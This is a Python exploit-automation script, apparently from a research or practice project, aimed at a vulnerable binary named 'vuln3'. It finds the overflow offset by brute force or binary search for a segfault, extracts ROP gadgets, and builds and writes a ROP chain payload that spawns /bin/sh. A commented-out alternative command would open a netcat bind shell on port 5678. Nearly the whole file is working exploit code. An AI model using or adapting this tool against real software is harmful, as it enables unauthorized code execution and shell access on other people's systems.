import os
import ROPcompile
import ReverseExecutionASLR as RevExe

BINARY_BITS = 32

BRUTE_FORCE = 0
BINARY_SEARCH = 1
ANALYSIS = 2

#COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"/bin//sh\", NULL)"
COMMAND = "execve(\"/bin//sh\")"
SHELLCODE = ["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11
PROGRAM = "vuln3"
FILE_MODE = True

def main():
    program = "./" + PROGRAM
    if FILE_MODE:
        program += " "
    else:
        program += " < "

    #STEP 1 - Buffer Discovery
    #bufferLength = bufferDiscovery(BINARY_SEARCH, program)
    bufferLength = 44
    print(bufferLength)
    #STEP 2 - Create ROP Chain
    #ROPchain = createROPchain(COMMAND, bufferLength)
    ROPchain = makeROPchain(SHELLCODE, bufferLength)

    #STEP 3a - Verify success with known .data

    #STEP 3b - Verify success with random .data

def bufferDiscovery(mode, program):
    global BINARY_BITS

    if BINARY_BITS == 32:
        if(mode == BRUTE_FORCE):
            print("Brute Force")
            return bruteForce32(program)
        
        if(mode == BINARY_SEARCH):
            print("Binary Search")
            return binarySearch32(program)
        
        if(mode == ANALYSIS):
            #Do Something
            print("Analysis")
        

    if BINARY_BITS == 64:
        if(mode == BRUTE_FORCE):
            print("Brute Force")
            return bruteForce64(program)
        
        if(mode == BINARY_SEARCH):
            print("Binary Search")
            return binarySearch64(program)
        
        if(mode == ANALYSIS):
            #Do Something
            print("Analysis")
        

def bruteForce32(program):
    fileLoc = "payload"
    test = open(fileLoc, "w")
    payload = ""
    for i in range(0, 128):
        payload = 'A' * i
        writePayload(test, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(i) + ", returned code " + str(output))
        if output != 0:
            return i - 1 + (BINARY_BITS/8)
    return -1

def bruteForce64(program):
    fileLoc = "payload"
    test = open(fileLoc, "w")
    payload = ""
    
    #TODO write bruteForce for 64 bit binaries


def binarySearch32(program):
    fileLoc = "payload"
    payload = ""
    found = False
    Low = 1
    High = 1
    output = 0

    #Work Up to find a SEG FAULT
    while output != 35584:
        payload = 'A' * High
        writePayload(fileLoc, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(High) + ", returned code " + str(output))
        High = High * 2
        if(High > 512):
            quit() #Exit out if buffer is very large

    #Work Down to earliest SEG FAULT
    while found == False:
        payload = 'A' * int((High + Low) / 2)
        writePayload(fileLoc, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(int((High + Low) / 2)) + ", returned code " + str(output))
        if output == 35584:
            High = int((High + Low) / 2)
        if output == 0:
            Low = int((High + Low) / 2)
        if High == Low + 1:
            found = True

    return High + int(BINARY_BITS/8)

def binarySearch64(program):
    fileLoc = "payload"
    payload = ""
    found = False
    Low = 1
    High = 8192 # Arbitrary High value
    output = 0

    #TODO Write Binary Search for 64 bit binaries


def writePayload(file, string):
    f = open(file, "w")
    f.write(string)

def run(program, payload):
    command = program + payload
    return os.system(command)

def createROPchain(command, bufflength):

    #Find ROP gadgets
    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")

    #Write command as gadgets
    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt", BINARY_BITS)

    #Write the payload
    pfile = open("payload", "bw")
    pfile.write(payload)

def makeROPchain(shellcode, bufflength):

    #Find ROP gadgets
    #os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")

    #Write Shellcode as gadgets
    dictionary = {}
    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
    gadgets = dictionary.keys()
    payload = RevExe.create(shellcode, gadgets)
    #for i, _ in enumerate(payload):
        #if type(payload[i]) is bytes:
            #payload[i] = payload[i]
            #continue
        #if payload[i][0] == '@':
            #payload[i] = ReverseExecution.generalToBytes(ROPcompile.dataaddressToValue(payload[i]) + 0x080da060)
            #continue
        #payload[i] = ReverseExecution.generalToBytes(int(dictionary.get(payload[i]),0))
    #bpayload = b''.join(payload)
    bpayload = ROPcompile.AssemblyListToGadgets(payload, bufflength, dictionary)
    print(payload)
    print(bpayload)

    #Write the payload
    pfile = open("payload", "bw")
    pfile.write(bpayload)


if __name__ == "__main__":
    main()
